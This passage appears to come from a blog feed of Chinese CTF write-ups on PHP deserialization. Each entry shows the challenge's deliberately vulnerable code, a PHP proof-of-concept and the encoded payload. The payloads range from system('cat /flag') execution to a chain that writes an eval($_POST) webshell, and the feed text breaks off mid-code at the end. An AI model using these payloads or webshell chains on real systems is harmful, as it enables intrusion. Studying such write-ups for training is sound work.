    <content type="html"><![CDATA[<h1 id="serCat3"><a href="#serCat3" class="headerlink" title="serCat3"></a>serCat3</h1><p>[SWPUCTF 2021 新生赛]1z_unserialize</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lyh</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lly</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;lt;</span><br><span class="line">        <span class="variable">$a</span>(<span class="variable language_">$this</span>-&gt;lly);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Sonder&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//stick-serCat3</span></span><br><span class="line"><span class="comment">//[SWPUCTF 2021 新生赛]1z_unserialize</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lyh</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lt</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lly</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">lyh</span>()));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A3%3A%22lyh%22%3A2%3A%7Bs%3A2%3A%22lt%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22lly%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>POST传参</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serCat3&quot;&gt;&lt;a href=&quot;#serCat3&quot; class=&quot;headerlink&quot; title=&quot;serCat3&quot;&gt;&lt;/a&gt;serCat3&lt;/h1&gt;&lt;p&gt;[SWPUCTF 2021 新生赛]1z_unserialize&lt;/p&gt;
&lt;figure class</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>serCat2</title>
    <link href="http://example.com/2023/12/22/serCat2/"/>
    <id>http://example.com/2023/12/22/serCat2/</id>
    <published>2023-12-22T13:52:23.000Z</published>
    <updated>2023-12-23T04:42:29.578Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serCat2"><a href="#serCat2" class="headerlink" title="serCat2"></a>serCat2</h1><p>[SWPUCTF 2021 新生赛]ez_unserialize</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;cl45s.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;admin = <span class="string">&quot;user&quot;</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;passwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd === <span class="string">&quot;ctf&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Just a bit more!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$p</span>);</span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//stick-serCat2</span></span><br><span class="line"><span class="comment">//[SWPUCTF 2021 新生赛]ez_unserialize</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">wllm</span>());</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>访问robots.txt，得到c145s.php，得到题目</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serCat2&quot;&gt;&lt;a href=&quot;#serCat2&quot; class=&quot;headerlink&quot; title=&quot;serCat2&quot;&gt;&lt;/a&gt;serCat2&lt;/h1&gt;&lt;p&gt;[SWPUCTF 2021 新生赛]ez_unserialize&lt;/p&gt;
&lt;figure class</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>serCat1</title>
    <link href="http://example.com/2023/12/22/serCat1/"/>
    <id>http://example.com/2023/12/22/serCat1/</id>
    <published>2023-12-22T13:51:23.000Z</published>
    <updated>2023-12-23T04:42:29.528Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serCat1"><a href="#serCat1" class="headerlink" title="serCat1"></a>serCat1</h1><p>攻防世界Web_php_unserialize</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">//the secret is in the flag.php</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//stick-serCat1</span></span><br><span class="line"><span class="comment">//攻防世界Web_php_unserialize</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo serialize(new Demo());</span></span><br><span class="line"><span class="comment">//O:4:&quot;Demo&quot;:1:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;O:+4:&quot;Demo&quot;:2:&#123;S:10:&quot;\00Demo\00file&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TzorNDoiRGVtbyI6Mjp7UzoxMDoiXDAwRGVtb1wwMGZpbGUiO3M6ODoiZmxhZy5waHAiO30=</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serCat1&quot;&gt;&lt;a href=&quot;#serCat1&quot; class=&quot;headerlink&quot; title=&quot;serCat1&quot;&gt;&lt;/a&gt;serCat1&lt;/h1&gt;&lt;p&gt;攻防世界Web_php_unserialize&lt;/p&gt;
&lt;figure class=&quot;highlig</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>serDemo5 buu 2020新春红包题</title>
    <link href="http://example.com/2023/12/22/serDemo5/"/>
    <id>http://example.com/2023/12/22/serDemo5/</id>
    <published>2023-12-22T13:45:23.000Z</published>
    <updated>2023-12-23T04:42:29.922Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serDemo5-buu-2020新春红包题"><a href="#serDemo5-buu-2020新春红包题" class="headerlink" title="serDemo5 buu 2020新春红包题"></a>serDemo5 buu 2020新春红包题</h1><p>传入?src&#x3D;1，查看源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$store</span>, <span class="variable">$key</span> = <span class="string">&#x27;flysystem&#x27;</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store = <span class="variable">$store</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;expire = <span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$contents</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$cachedProperties</span> = <span class="title function_ invoke__">array_flip</span>([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;dirname&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;basename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;extension&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;mimetype&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;visibility&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;timestamp&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$contents</span> <span class="keyword">as</span> <span class="variable">$path</span> =&gt; <span class="variable">$object</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$object</span>)) &#123;</span><br><span class="line">                <span class="variable">$contents</span>[<span class="variable">$path</span>] = <span class="title function_ invoke__">array_intersect_key</span>(<span class="variable">$object</span>, <span class="variable">$cachedProperties</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$cleaned</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanContents</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([<span class="variable">$cleaned</span>, <span class="variable">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$contents</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getForStorage</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="variable">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params"><span class="variable">$expire</span></span>): <span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) <span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 使缓存文件名随机</span></span><br><span class="line">        <span class="variable">$cache_filename</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . <span class="title function_ invoke__">uniqid</span>() . <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$cache_filename</span>, -<span class="title function_ invoke__">strlen</span>(<span class="string">&#x27;.php&#x27;</span>)) === <span class="string">&#x27;.php&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cache_filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$serialize</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">            <span class="variable">$expire</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expire</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getExpireTime</span>(<span class="variable">$expire</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">serialize</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">gzcompress</span>(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$options</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>] = <span class="number">111</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = <span class="string">&#x27;strval&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] = <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=uploads/&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="string">&#x27;/../c.php/.&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;expire = <span class="number">111</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;autosave=<span class="literal">false</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;cache = <span class="keyword">array</span>(<span class="string">&#x27;111&#x27;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;path&quot;</span>=&gt;<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+&quot;</span>));</span><br><span class="line"><span class="variable">$a</span>-&gt;complete = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A1%3A%22A%22%3A6%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A7%3A%22options%22%3Ba%3A4%3A%7Bs%3A13%3A%22data_compress%22%3Bb%3A0%3Bs%3A6%3A%22expire%22%3Bi%3A111%3Bs%3A9%3A%22serialize%22%3Bs%3A6%3A%22strval%22%3Bs%3A6%3A%22prefix%22%3Bs%3A58%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3Duploads%2F%22%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A11%3A%22%2F..%2Fc.php%2F.%22%3Bs%3A9%3A%22%00%2A%00expire%22%3Bi%3A111%3Bs%3A8%3A%22autosave%22%3Bb%3A0%3Bs%3A5%3A%22cache%22%3Ba%3A1%3A%7Bi%3A111%3Ba%3A1%3A%7Bs%3A4%3A%22path%22%3Bs%3A32%3A%22PD9waHAgZXZhbCgkX1BPU1RbY10pOz8%2B%22%3B%7D%7Ds%3A8%3A%22complete%22%3Bs%3A1%3A%222%22%3B%7D</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>从file_put_contents函数逆推，这里被触发就有可能写入webshell。<br>该函数用到的函数名会被getCacheKey处理一下，文件名来源于A中的key属性。<br>该函数中被写入的值来源于data变量，data变量由A中的contents经过serialize处理得到，serialize是一个可控变量，可以自己选定函数名。<br>serialize处理后可以进行压缩，但是这里显然是不能让他压缩，直接把options[‘data_compress’]定义为false即可。</p><p>也就是说，A中传递过来contents和key参数给B的set方法做处理，如果能选定适当的serialize函数，构造合适的contents以及合适的文件名，那么就可以写入webshell，获取flag。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">    <span class="comment">#key作文文件名</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">      <span class="comment">#/../用于绕过uniqid生成的随机值，后面的/.用来绕过文件名限制</span></span><br><span class="line">        <span class="variable 